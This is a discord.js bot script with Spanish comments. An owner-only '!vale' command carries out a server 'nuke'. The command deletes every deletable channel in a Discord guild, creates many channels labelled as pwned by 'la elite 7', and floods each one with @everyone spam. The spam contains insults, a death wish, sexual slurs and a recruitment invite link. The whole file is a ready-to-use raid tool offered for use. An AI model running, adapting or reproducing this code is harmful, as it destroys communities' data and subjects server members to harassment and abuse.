require('dotenv').config();

const { Client, GatewayIntentBits, ChannelType } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

const PREFIX = '!';
const OWNER_IDS = ["1436516806842912970"]; // ← cambia por tu ID real si es necesario

client.once('ready', () => {
  console.log('Bot conectado como ' + client.user.tag);
  console.log('Prefijo: ' + PREFIX);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'test') {
    return message.reply('¡El bot funciona! Prefijo detectado correctamente.');
  }

  if (command === 'help') {
    return message.reply('Comandos disponibles:\n!test → prueba rápida\n!vale → nuke personalizado (solo tú)\n!help → este mensaje');
  }

  if (command === 'vale') {
  if (!OWNER_IDS.includes(message.author.id)) {
    return message.reply('No tienes permiso para este comando tan heavy.');
  }

  // ────────────────────────────────────────────────
  //     PERSONALIZA CANALES Y MENSAJES AQUÍ
  // ────────────────────────────────────────────────

  const nombresDeCanales = [
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
     "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    "pwned-by-la-elite-7-brou",
    // Agrega o quita nombres aquí
  ];

  const mensajesEnRafaga = [
    "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7",
    "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7",
    "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7",
    "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7",
    "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7",
    "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
    "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7",
    "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7",
    "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7",
    "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7",
    "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7",
    "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
    "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7",
    "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7",
    "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7",
    "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7",
    "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7",
    "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7",
    "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
    "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7",
    "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7",
        "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7",
    "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7",
    "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7",
    "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7",
    "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7",
    "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
    "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7",
    "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7",
    "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7"
    // Agrega o quita mensajes aquí
  ];

  const delayCreacionCanales = 300;   // 0.3 segundos entre creación (más rápido)
  const delayEntreMensajes = 400;     // 0.4 segundos entre mensajes (más rápido)

  // ────────────────────────────────────────────────
  //        NO CAMBIES DE AQUÍ PARA ABAJO
  // ────────────────────────────────────────────────

  try {
    await message.reply(
      `**¡NUKE RÁPIDO INICIANDO EN 5,00 SEGUNDOS!**\n\n` +
      `→ Creando **${nombresDeCanales.length}** canales\n` +
      `→ Enviando **${mensajesEnRafaga.length}** mensajes en CADA canal\n\n` +
      `¡Va a ir más rápido ahora!`
    );

    await new Promise(r => setTimeout(r, 500));

    const guild = message.guild;

    // 1. Borrar canales (rápido)
    let borrados = 0;
    for (const ch of guild.channels.cache.values()) {
      if (ch.deletable && ch.id !== message.channel.id) {
        try {
          await ch.delete('Nuke rápido by Patricio');
          borrados++;
          await new Promise(r => setTimeout(r, 200)); // delay mínimo
        } catch {}
      }
    }
    await message.channel.send(`→ Borrados **${borrados}** canales.`);

    // 2. Crear canales (más rápido)
    const nuevosCanales = [];
    for (const nombreOriginal of nombresDeCanales) {
      try {
        let nombre = nombreOriginal
          .toLowerCase()
          .replace(/[^a-z0-9- ]/g, '-')
          .replace(/\s+/g, '-')
          .replace(/-+/g, '-')
          .replace(/^-|-$/g, '')
          .slice(0, 100) || 'raid-default';

        const canal = await guild.channels.create({
          name: nombre,
          type: ChannelType.GuildText,
          permissionOverwrites: [
            { id: guild.id, allow: ['ViewChannel', 'SendMessages', 'MentionEveryone'] }
          ]
        });

        nuevosCanales.push(canal);
        console.log(`Creado → #${canal.name}`);
        await new Promise(r => setTimeout(r, delayCreacionCanales));
      } catch (err) {
        console.log(`Fallo creando "${nombreOriginal}": ${err.message}`);
        await new Promise(r => setTimeout(r, 2000)); // espera más si falla (rate limit)
      }
    }
    await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`);

    // 3. Spam rápido en cada canal
    let spameados = 0;
    for (const canal of nuevosCanales) {
      try {
        for (const msg of mensajesEnRafaga) {
          await canal.send(msg);
          console.log(`Enviado a #${canal.name}`);
          await new Promise(r => setTimeout(r, delayEntreMensajes));
        }
        spameados++;
      } catch (err) {
        console.log(`Problema en #${canal.name}: ${err.message}`);
        await new Promise(r => setTimeout(r, 3000)); // espera si rate limit
      }
    }

    await message.channel.send(`**¡TERMINADO RÁPIDO!** 😈\nCanales spameados: **${spameados}**`);

  } catch (err) {
    console.error('Error en !vale:', err.message || err);
    await message.channel.send(`**Error grave:** ${err.message || 'Revisa logs'}`).catch(() => {});
  }
}
});

client.login(process.env.TOKEN).catch(err => {
  console.error('Error al conectar:', err.message || err);
});